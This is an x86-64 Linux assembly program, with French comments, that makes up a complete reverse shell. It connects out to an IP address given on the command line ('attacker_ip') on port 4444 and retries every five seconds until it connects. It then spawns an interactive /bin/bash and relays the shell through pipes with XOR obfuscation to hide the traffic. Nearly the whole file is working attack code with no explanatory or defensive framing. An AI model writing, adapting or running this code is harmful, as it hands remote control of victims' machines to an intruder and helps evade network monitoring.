section .data
    xor_key      db 0x41, 0x42, 0x43, 0x44
    
    command      db '/bin/bash',0
    bash_i       db '-i',0
    bash_args    dq command, bash_i, 0
    
    timespec     dq 5, 0              
    port_num     dw 4444         
    
    err_usage    db 'Usage: ./reverse <attacker_ip>',10,0
    err_ip_format db 'Error: Invalid IP format',10,0
    err_socket   db 'Error: Socket creation failed',10,0
    err_connect  db 'Error: Connection failed',10,0

section .bss
    ip_bytes     resd 1          
    port_bytes   resw 1           
    sockaddr     resb 16          
    envp         resq 256         
    buffer       resb 8192        
    pipe_read    resd 1           
    pipe_write   resd 1           

section .text
    global _start

;----------------------------------------------------------
; Validation et conversion de l'IP
;----------------------------------------------------------
validate_and_parse_ip:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    
    mov rsi, rdi
    xor rbx, rbx                  
    xor r12d, r12d                
    xor r13d, r13d                

.parse_loop:
    movzx edx, byte [rsi]
    test dl, dl
    jz .end_parse
    
    cmp dl, '.'
    je .store_octet
    
    cmp dl, '0'
    jb .invalid
    cmp dl, '9'
    ja .invalid
    
    sub dl, '0'
    imul r13d, r13d, 10
    add r13d, edx
    cmp r13d, 255
    ja .invalid
    
    inc rsi
    jmp .parse_loop

.store_octet:
    cmp bl, 3
    jae .invalid
    
    shl r12d, 8
    or r12d, r13d
    inc bl
    xor r13d, r13d
    inc rsi
    jmp .parse_loop

.end_parse:
    cmp bl, 3
    jne .invalid
    
    shl r12d, 8
    or r12d, r13d
    mov eax, r12d
    bswap eax
    mov [ip_bytes], eax
    mov rax, 1
    jmp .done

.invalid:
    xor rax, rax
.done:
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

;---------------------------------------------------------
;                          XOR 
;---------------------------------------------------------
xor_crypt:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13

    mov r10, rdi                  
    mov r11, rsi                  
    mov r12d, edx                 
    xor r13, r13                  

.loop:
    cmp r13, r11
    jae .end

    mov ecx, r13d
    and ecx, 3
    shl ecx, 3

    mov eax, r12d
    shr eax, cl
    and al, 0xFF

    mov bl, [r10 + r13]
    xor bl, al
    mov [r10 + r13], bl

    inc r13
    jmp .loop

.end:
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

;----------------------------------------------------------
; Gestion des arguments et environnement
;----------------------------------------------------------
jmp_arg:
    mov rax, [rbx]
    add rbx, 8
    test rax, rax
    jnz jmp_arg
    ret

jmp_envp:
    lea rdi, [envp]
env_loop:
    mov rax, [rbx]
    test rax, rax
    je done
    mov [rdi], rax
    add rdi, 8
    add rbx, 8
    jmp env_loop
done:
    mov qword [rdi], 0
    ret

;----------------------------------------------------------
; Proxy de chiffrement - Thread pour socket vers bash
;----------------------------------------------------------
proxy_socket_to_bash:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14

    mov r12, rdi                  
    mov r13, rsi                  

.read_loop:
    mov rax, 0                    
    mov rdi, r12
    lea rsi, [buffer]
    mov rdx, 8192
    syscall

    test rax, rax
    jle .end

    mov r14, rax                  

    lea rdi, [buffer]
    mov rsi, r14
    mov edx, [xor_key]
    call xor_crypt

    mov rax, 1                    
    mov rdi, r13
    lea rsi, [buffer]
    mov rdx, r14
    syscall

    jmp .read_loop

.end:
    pop r14
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

;----------------------------------------------------------
;                   Proxy de chiffrement
;----------------------------------------------------------
proxy_bash_to_socket:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14

    mov r12, rdi                 
    mov r13, rsi                  

.read_loop:
    mov rax, 0                   
    mov rdi, r12
    lea rsi, [buffer]
    mov rdx, 8192
    syscall

    test rax, rax
    jle .end

    mov r14, rax                  

    lea rdi, [buffer]
    mov rsi, r14
    mov edx, [xor_key]
    call xor_crypt

    mov rax, 1                    
    mov rdi, r13
    lea rsi, [buffer]
    mov rdx, r14
    syscall

    jmp .read_loop

.end:
    pop r14
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

;----------------------------------------------------------
; Programme principal
;----------------------------------------------------------
_start:
    mov rbx, rsp
    
    pop rcx                      
    cmp rcx, 2
    jne usage_error

    call jmp_arg
    call jmp_envp
    
    pop rsi                       
    pop rdi                       
    
    call validate_and_parse_ip
    test rax, rax
    jz ip_error

    mov ax, [port_num]
    xchg al, ah
    mov [port_bytes], ax

connection_loop:
    mov rax, 41                   
    mov rdi, 2                    
    mov rsi, 1                    
    xor rdx, rdx
    syscall 
    
    test rax, rax
    js socket_error
    mov r8, rax                   

    lea rdi, [sockaddr]
    mov word [rdi], 2
    mov ax, [port_bytes]
    mov word [rdi+2], ax
    mov eax, [ip_bytes]
    mov dword [rdi+4], eax
    mov qword [rdi+8], 0

    mov rax, 42                  
    mov rdi, r8
    lea rsi, [sockaddr]
    mov rdx, 16
    syscall
    
    test rax, rax
    js connect_error

    sub rsp, 8
    mov rax, 22                  
    mov rdi, rsp
    syscall
    test rax, rax
    js exit_program
    
    mov eax, [rsp]                
    mov [pipe_read], eax
    mov eax, [rsp+4]                
    mov [pipe_write], eax
    add rsp, 8

    
    sub rsp, 8
    mov rax, 22                   
    mov rdi, rsp
    syscall
    test rax, rax
    js exit_program
    
    mov r9d, [rsp]                
    mov r10d, [rsp+4]             
    add rsp, 8

    mov rax, 57                   
    syscall
    test rax, rax
    jz .bash_process
    js exit_program

    mov r11, rax                 

    mov rax, 3
    mov rdi, [pipe_read]
    syscall
    mov rax, 3
    mov rdi, r10
    syscall

    mov rax, 57                   
    syscall
    test rax, rax
    jz .proxy_to_bash
    js exit_program

    mov rdi, r9                   
    mov rsi, r8                   
    call proxy_bash_to_socket
    jmp exit_program

.proxy_to_bash:
    mov rdi, r8                   
    mov rsi, [pipe_write]         
    call proxy_socket_to_bash
    mov rax, 60
    xor rdi, rdi
    syscall

.bash_process:

    mov rax, 33                   
    mov rdi, [pipe_read]
    mov rsi, 0
    syscall
    

    mov rax, 33                   
    mov rdi, r10
    mov rsi, 1
    syscall
    

    mov rax, 33                   
    mov rdi, r10
    mov rsi, 2
    syscall

    mov rax, 3
    mov rdi, [pipe_read]
    syscall
    mov rax, 3
    mov rdi, [pipe_write]
    syscall
    mov rax, 3
    mov rdi, r9
    syscall
    mov rax, 3
    mov rdi, r10
    syscall
    mov rax, 3
    mov rdi, r8
    syscall

    mov rax, 59                   
    lea rdi, [command]            
    lea rsi, [bash_args]          
    lea rdx, [envp]               
    syscall

    mov rax, 60
    mov rdi, 1
    syscall

;----------------------------------------------------------
; Gestion des erreurs
;----------------------------------------------------------
usage_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_usage]
    mov rdx, 30
    syscall
    jmp exit_program

ip_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_ip_format]
    mov rdx, 25
    syscall
    jmp exit_program

socket_error:
    mov rax, 1
    mov rdi, 2
    lea rsi, [err_socket]
    mov rdx, 28
    syscall
    jmp exit_program

connect_error:
    mov rax, 3
    mov rdi, r8
    syscall

    mov rax, 35                   
    lea rdi, [timespec]
    xor rsi, rsi
    syscall
    jmp connection_loop

exit_program:
    mov rax, 60
    xor rdi, rdi
    syscall
